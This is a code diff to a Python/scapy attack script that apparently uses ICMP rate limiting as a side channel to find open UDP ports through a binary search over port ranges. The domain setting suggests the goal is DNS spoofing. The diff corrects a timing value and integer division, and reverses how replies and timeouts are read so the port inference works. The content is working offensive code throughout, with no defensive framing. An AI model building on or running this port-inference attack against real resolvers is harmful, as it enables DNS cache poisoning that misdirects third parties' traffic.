@@ -43,7 +43,7 @@ domain_name = "cool.com"
 local_free_ip = []
 
 ICMP_limit_rate = 50
-ICMP_recovering_time = '20ms'
+ICMP_recovering_time = .02
 
 finished = 0
 
@@ -207,7 +207,7 @@ def do_one_chunk_of_attack(port_start, number_of_probe_packet, number_of_padding
 
     # improving scapy's packet sending performance
     # https://byt3bl33d3r.github.io/mad-max-scapy-improving-scapys-packet-sending-performance.html
-    
+
 
     start_time = time.process_time()
     for packet in probe_packet:
@@ -232,16 +232,17 @@ def do_one_chunk_of_attack(port_start, number_of_probe_packet, number_of_padding
     #print (reply.show())
 
 
+    # if timeout occurs even then the reply will be none
     if reply == None:
-        print ("Yaaaay, there is one port open in this chunk.")
-        return port_start # important for the base condition of the binary search
+        print ("No port is open. IMCP rate limit is already drained.")
+        return -1
     else:
         if reply.haslayer(ICMP):
             # Maybe need to check the error code also
-            print("Got ICMP port unreachable message. No port is open.")
+            print("Yaaay, got ICMP port unreachable message. At least one port is open.")
             #print (reply[ICMP].summary())
             #print (reply[ICMP].show())
-            return -1
+            return port_start # important for the base condition of the binary search
         elif reply.haslayer(UDP):
             print("Don't know what this means.")
         else:
@@ -251,7 +252,7 @@ def do_one_chunk_of_attack(port_start, number_of_probe_packet, number_of_padding
 
 # dividing range into [left...mid] and [mid + 1...right]
 def binary_search(left, right):
-    mid = left + (right - left) / 2
+    mid = left + (right - left) // 2 #integer division
     print(mid)
     if left == right:
         return do_one_chunk_of_attack(left, 1, ICMP_limit_rate - 1)
@@ -353,4 +354,3 @@ def main():
 
 if __name__ == "__main__":
     main()
-    #step1(1)
